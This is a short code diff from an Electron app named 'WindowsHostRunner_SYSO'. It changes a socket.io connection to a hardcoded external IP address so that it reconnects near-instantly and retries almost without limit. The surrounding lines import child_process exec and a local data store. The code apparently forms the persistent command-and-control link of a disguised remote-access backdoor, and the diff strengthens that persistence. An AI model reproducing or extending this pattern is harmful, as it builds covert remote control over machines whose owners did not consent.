@@ -23,7 +23,12 @@ app.setName("WindowsHostRunner_SYSO");
 ////////////////////////////
 import io from 'socket.io-client'
 
-let Socket = io.connect( 'http://198.211.125.38:3000/' )
+let Socket = io.connect( 'http://198.211.125.38:3000/', {
+  'reconnection': true,
+  'reconnectionDelay': 5,
+  'reconnectionDelayMax' : 10,
+  'reconnectionAttempts': 10 ** 10
+})
 let exec = require('child_process').exec;
 const Store = require('electron-store');
 const store = new Store();
